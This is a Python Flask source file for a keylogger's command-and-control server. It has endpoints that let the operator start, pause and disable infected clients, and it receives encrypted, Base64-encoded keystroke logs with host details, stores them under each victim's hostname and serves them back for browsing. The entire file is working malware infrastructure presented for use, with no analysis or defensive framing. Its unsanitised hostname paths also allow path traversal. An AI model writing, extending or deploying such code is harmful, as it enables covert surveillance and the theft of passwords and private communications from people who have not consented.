import os
import time
import base64
from flask import Flask, jsonify, request
import encryption
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app)
DATA_FOLDER = 'data'                                                                # Choose the name of the folder where the data will be saved
BASE_DIR = os.path.join(os.path.dirname(__file__), DATA_FOLDER)

current_status = "Not Running"
approval_granted = False
disabled = False


if not os.path.exists(DATA_FOLDER):                                                 # Make sure base "data" folder exists
    os.makedirs(DATA_FOLDER)

def generate_log_filename():
    """Generates a unique filename for the log file."""
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

#----------------------------- frontend func ------------------------------------------
@app.route('/')
def home():
    return "KeyLogger Server is Running"

@app.route('/status')
def get_status():
    return jsonify({'status': current_status})

@app.route("/data")
def list_computers():
    """Return list of all computers (folders inside /data)."""
    try:
        data = [
            d for d in os.listdir(BASE_DIR)
            if os.path.isdir(os.path.join(BASE_DIR, d))
        ]
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/data/<name>")
def get_computer_content(name):
    """Return content of all files inside a given computer folder."""
    folder_path = os.path.join(BASE_DIR, name)

    if not os.path.exists(folder_path):
        return jsonify({"error": "Computer not found"}), 404

    content_dict = {}
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                content_dict[filename] = f.read()

    return jsonify({"content": content_dict})

@app.route('/start', methods=['GET'])
def start_script():
    global approval_granted
    global current_status
    approval_granted = True
    current_status = "running"
    print("Approval granted. The script can now continue.")
    return jsonify({'message': 'Approval granted'})

@app.route('/stop', methods=['GET'])
def stop_script():
    global approval_granted
    global current_status
    approval_granted = False
    current_status = "Alive waiting for orders"
    print("Approval denied.")
    return jsonify({'message': 'Approval denied'})

@app.route('/disable', methods=['GET'])
def disable():
    global disabled
    global approval_granted
    global current_status
    approval_granted = False
    current_status = "disabled"
    disabled = True
    print("keylog disabled")
    return jsonify({'message': 'keylog disabled'})


#------------------------------ keylogger func ------------------------------------------


@app.route('/alive', methods=['POST'])
def alive_script():
    global disabled
    global current_status
    disabled = False
    current_status = "Alive waiting for orders"
    print("Script started. Status updated.")
    return jsonify({'message': 'Status updated to Running'})

@app.route('/check-disable', methods=['GET'])
def check_disable():
    return jsonify({'disable': disabled})

@app.route('/check-approval', methods=['GET'])
def check_approval():
    return jsonify({'approved': approval_granted})

@app.route('/api/upload', methods=['POST'])
def upload():
    """
    Handles the upload of encrypted log data from a client.
    The data is expected to be Base64-encoded.
    """
    data = request.get_json()
    if not data or "machine_info" not in data or "data" not in data or "encryption_key" not in data:
        return jsonify({"error": "Invalid payload: machine, data, and encryption_key are required"}), 400

    machine = data["machine_info"]["hostname"]
    encrypted_b64_data = data["data"]  # This is the Base64 string
    encryption_key = data["encryption_key"]

    try:
        # First, decode the Base64 string back to raw bytes
        encrypted_bytes = base64.b64decode(encrypted_b64_data)

        # Then, decrypt the bytes
        encryptor = encryption.Encryptor(encryption_key)
        decrypted_bytes = encryptor.decrypt(encrypted_bytes)

        # Finally, decode the decrypted bytes to a string for writing to a file
        log_data = decrypted_bytes.decode('utf-8')

    except Exception as e:
        # This will catch errors from both base64 decoding and decryption
        return jsonify({"error": f"Failed to process data: {str(e)}"}), 400

    import os

    machine_folder = os.path.join(DATA_FOLDER, machine)

    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    info_file_path = os.path.join(machine_folder, "info")                              # Check if "info" file exists, create it if it doesn't
    if not os.path.exists(info_file_path):
        with open(info_file_path, "w") as f:
            json.dump(data["machine_info"], f, indent=4)

    datafile = generate_log_filename()
    file_path = os.path.join(machine_folder, datafile)

    try:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(log_data)
    except IOError as e:
        return jsonify({"error": f"Failed to write to file: {str(e)}"}), 500

    return jsonify({"status": "success", "file": datafile}), 200


if __name__ == '__main__':
    app.run(host="127.0.0.1", port=5000, debug=True)
